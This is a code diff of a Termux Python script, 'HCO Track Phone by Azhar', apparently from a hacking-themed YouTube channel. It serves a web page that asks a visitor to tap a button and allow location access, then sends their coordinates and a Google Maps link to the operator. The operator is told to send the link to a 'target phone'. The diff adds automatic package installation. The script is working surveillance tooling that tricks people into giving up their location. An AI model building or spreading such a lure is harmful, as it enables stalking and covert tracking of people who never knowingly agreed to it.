@@ -1,13 +1,13 @@
-# HCO Track Phone by Azhar - FINAL WORKING VERSION
-# No more permission errors!
+# HCO Track Phone by Azhar - AUTO INSTALL VERSION
+# Just run this one file - everything installs automatically!
 
 import os
+import sys
 import subprocess
 import threading
 import time
 import socket
-import requests
-from flask import Flask, request, render_template_string, jsonify
+from flask import Flask, request, render_template_string
 
 # Color codes
 RED = "\033[1;91m"
@@ -19,6 +19,25 @@ RESET = "\033[0m"
 
 locations = {}
 app = Flask(__name__)
+
+# Auto-install everything
+def auto_install():
+    print(f"{YELLOW}🔧 Auto-installing everything...{RESET}")
+    
+    # Update Termux packages
+    print(f"{YELLOW}📦 Updating Termux packages...{RESET}")
+    os.system('pkg update -y && pkg upgrade -y')
+    
+    # Install required system packages
+    print(f"{YELLOW}📦 Installing system packages...{RESET}")
+    os.system('pkg install python -y')
+    os.system('pkg install curl -y')
+    
+    # Install Python packages
+    print(f"{YELLOW}🐍 Installing Python packages...{RESET}")
+    os.system('pip install flask qrcode[pil] requests --upgrade')
+    
+    print(f"{GREEN}✅ All packages installed successfully!{RESET}")
 
 # Tool lock message
 def tool_lock():
@@ -36,11 +55,11 @@ def tool_lock():
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f"{GREEN}✓ Opening YouTube...{RESET}")
     except:
-        print(f"{YELLOW}⚠️  Open YouTube: youtube.com/@hackers_colony_tech{RESET}")
+        print(f"{YELLOW}⚠️  Open: youtube.com/@hackers_colony_tech{RESET}")
     
     time.sleep(3)
 
-# Get correct local IP
+# Get local IP
 def get_local_ip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -63,23 +82,21 @@ def find_port():
             continue
     return 8080
 
-# Flask routes - SIMPLE CLICK-BASED VERSION
+# Flask app
 @app.route('/')
 def home():
     html = '''
     <!DOCTYPE html>
     <html>
     <head>
-        <title>HCO Track Phone</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <style>
             body { 
-                background: black; 
-                color: white; 
+                background: #000; 
+                color: #fff; 
                 text-align: center; 
                 font-family: Arial; 
                 padding: 20px;
-                margin: 0;
             }
             .container { 
                 max-width: 100%; 
@@ -87,40 +104,35 @@ def home():
                 padding: 20px; 
             }
             .logo { 
-                color: red; 
+                color: #f00; 
                 font-size: 24px; 
                 font-weight: bold; 
-                margin-bottom: 20px; 
-                text-shadow: 0 0 10px red;
+                margin: 20px 0; 
+                text-shadow: 0 0 10px #f00;
             }
             .btn {
-                background: lime;
-                color: black;
+                background: #0f0;
+                color: #000;
                 border: none;
-                padding: 25px 50px;
-                font-size: 22px;
+                padding: 20px 40px;
+                font-size: 20px;
                 font-weight: bold;
-                border-radius: 15px;
+                border-radius: 10px;
                 cursor: pointer;
                 margin: 20px 0;
             }
             .message {
                 font-size: 18px;
                 margin: 20px 0;
-                padding: 20px;
+                padding: 15px;
                 border-radius: 10px;
                 background: #222;
             }
             .success {
-                color: lime;
-                font-size: 24px;
+                color: #0f0;
+                font-size: 22px;
                 font-weight: bold;
                 padding: 20px;
-            }
-            .instructions {
-                color: yellow;
-                font-size: 18px;
-                margin: 15px 0;
             }
         </style>
     </head>
@@ -129,10 +141,10 @@ def home():
             <div class="logo">HCO TRACK PHONE BY AZHAR</div>
             
             <div class="message">
-                <div class="instructions">📱 <strong>HOW TO USE:</strong></div>
-                <div>1. Click the BIG GREEN button below</div>
-                <div>2. Click <strong style="color:lime">ALLOW</strong> if browser asks for permission</div>
-                <div>3. That's it! Location will be sent automatically</div>
+                📱 <strong>HOW TO USE:</strong><br>
+                1. Click the GREEN button<br>
+                2. Click ALLOW when asked<br>
+                3. That's it!
             </div>
             
             <button class="btn" onclick="getLocation()">📍 GET MY LOCATION</button>
@@ -147,76 +159,47 @@ def home():
             
             status.innerHTML = '🔄 Please wait...';
             btn.disabled = true;
-            btn.innerHTML = '🔄 Getting location...';
+            btn.innerHTML = '🔄 Processing...';
             
-            // Check if browser supports geolocation
             if (!navigator.geolocation) {
-                status.innerHTML = '❌ Your browser does not support location tracking';
+                status.innerHTML = '❌ Browser not supported';
                 btn.disabled = false;
                 btn.innerHTML = '📍 TRY AGAIN';
                 return;
             }
             
-            // Get current position
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    // Success - got location
-                    sendLocation(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
+                    sendLocation(position.coords.latitude, position.coords.longitude);
                 },
                 function(error) {
-                    // Error handling
                     btn.disabled = false;
                     btn.innerHTML = '📍 TRY AGAIN';
-                    
-                    if (error.code === error.PERMISSION_DENIED) {
-                        status.innerHTML = '❌ <strong>Permission was denied!</strong><br>' +
-                                         'Please refresh page and click <strong>ALLOW</strong> when asked';
-                    } else if (error.code === error.TIMEOUT) {
-                        status.innerHTML = '❌ Location request timed out. Please try again.';
-                    } else {
-                        status.innerHTML = '❌ Cannot get location. Please try again.';
-                    }
+                    status.innerHTML = '❌ Please allow location access and try again';
                 },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 30000,
-                    maximumAge: 0
-                }
+                { timeout: 15000 }
             );
         }
         
-        function sendLocation(lat, lon, accuracy) {
+        function sendLocation(lat, lon) {
             var status = document.getElementById('status');
             var btn = document.querySelector('.btn');
             
             status.innerHTML = '📡 Sending location...';
             
-            // Send to server using fetch
             fetch('/update', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    lat: lat,
-                    lon: lon,
-                    accuracy: accuracy
-                })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({lat: lat, lon: lon})
             })
-            .then(response => {
-                if (response.ok) {
-                    return response.text();
-                }
-                throw new Error('Network error');
-            })
+            .then(response => response.text())
             .then(data => {
-                status.innerHTML = '<div class="success">✅ You are a good person! God Bless You 🙏</div>' +
-                                  '<div style="margin-top:15px;">📍 Location sent successfully!</div>' +
-                                  '<div style="margin-top:10px;">You can close this page now</div>';
+                status.innerHTML = '<div class="success">✅ God Bless You! 🙏</div>' +
+                                  '<div>Location sent successfully!</div>';
                 btn.style.display = 'none';
             })
             .catch(error => {
-                status.innerHTML = '❌ Failed to send location. Please try again.';
+                status.innerHTML = '❌ Error. Please try again.';
                 btn.disabled = false;
                 btn.innerHTML = '📍 TRY AGAIN';
             });
@@ -238,14 +221,14 @@ def update():
             print(f"{GREEN}📍 Location received: {data['lat']}, {data['lon']}{RESET}")
             return "OK"
         return "ERROR"
-    except Exception as e:
-        print(f"{RED}Error processing location: {e}{RESET}")
+    except:
         return "ERROR"
 
 def start_server(port):
-    from werkzeug.serving import make_server
-    server = make_server('0.0.0.0', port, app, threaded=True)
-    server.serve_forever()
+    try:
+        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+    except:
+        pass
 
 # Generate QR code
 def make_qr(url):
@@ -255,37 +238,21 @@ def make_qr(url):
         qr.add_data(url)
         qr.make(fit=True)
         img = qr.make_image(fill_color="red", back_color="white")
-        qr_path = "/data/data/com.termux/files/home/track_qr.png"
-        img.save(qr_path)
+        img.save("/data/data/com.termux/files/home/track_qr.png")
         
         try:
-            subprocess.run(["termux-open", qr_path],
+            subprocess.run(["termux-open", "/data/data/com.termux/files/home/track_qr.png"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except:
             pass
-            
-        return True
     except:
-        return False
-
-# Install requirements
-def install_requirements():
-    try:
-        import flask
-        import qrcode
-        return True
-    except ImportError:
-        print(f"{YELLOW}Installing required packages...{RESET}")
-        try:
-            subprocess.run([sys.executable, "-m", "pip", "install", "flask", "qrcode[pil]"],
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
-            return True
-        except:
-            print(f"{RED}Failed to install packages{RESET}")
-            return False
+        pass
 
 # Main function
 def main():
+    # Auto-install everything first
+    auto_install()
+    
     # Show tool lock
     tool_lock()
     
@@ -294,36 +261,27 @@ def main():
     
     print(f"{GREEN}🚀 Starting HCO Track Phone...{RESET}")
     
-    # Install requirements
-    if not install_requirements():
-        print(f"{YELLOW}Please run: pip install flask qrcode[pil]{RESET}")
-        return
-    
-    # Get correct IP and port
+    # Get IP and port
     local_ip = get_local_ip()
     port = find_port()
     TRACKING_URL = f"http://{local_ip}:{port}"
     
-    print(f"{GREEN}✅ Server started on: {local_ip}:{port}{RESET}")
-    
-    # Start server in thread
+    # Start server
     server_thread = threading.Thread(target=start_server, args=(port,), daemon=True)
     server_thread.start()
-    
     time.sleep(2)
     
     # Generate QR code
-    print(f"{YELLOW}📱 Generating QR code...{RESET}")
     make_qr(TRACKING_URL)
     
-    # Show banner
+    # Show info
     print(f"\n{RED}{'═'*60}{RESET}")
     print(f"{RED}{'HCO TRACK PHONE BY AZHAR'.center(60)}{RESET}")
     print(f"{RED}{'═'*60}{RESET}")
-    print(f"\n{GREEN}📱 Send this link to target phone:{RESET}")
+    print(f"\n{GREEN}📱 Send this link:{RESET}")
     print(f"{CYAN}{TRACKING_URL}{RESET}")
-    print(f"\n{YELLOW}📍 QR code should open automatically{RESET}")
-    print(f"\n{BLUE}💡 Both phones must be on same WiFi network{RESET}")
+    print(f"\n{YELLOW}📍 QR code opened automatically{RESET}")
+    print(f"\n{BLUE}💡 Both phones on same WiFi{RESET}")
     print(f"\n{RED}{'═'*60}{RESET}")
     
     # Wait for location
@@ -337,9 +295,7 @@ def main():
             print(f"\n{GREEN}✅ LOCATION RECEIVED!{RESET}")
             print(f"{GREEN}Latitude: {locations['lat']}{RESET}")
             print(f"{GREEN}Longitude: {locations['lon']}{RESET}")
-            print(f"{GREEN}Accuracy: {locations.get('accuracy', 'N/A')}m{RESET}")
-            print(f"{GREEN}Google Maps: https://maps.google.com/?q={locations['lat']},{locations['lon']}{RESET}")
-            print(f"{GREEN}Time: {time.ctime(locations['time'])}{RESET}")
+            print(f"{GREEN}Maps: https://maps.google.com/?q={locations['lat']},{locations['lon']}{RESET}")
         
         time.sleep(2)
 
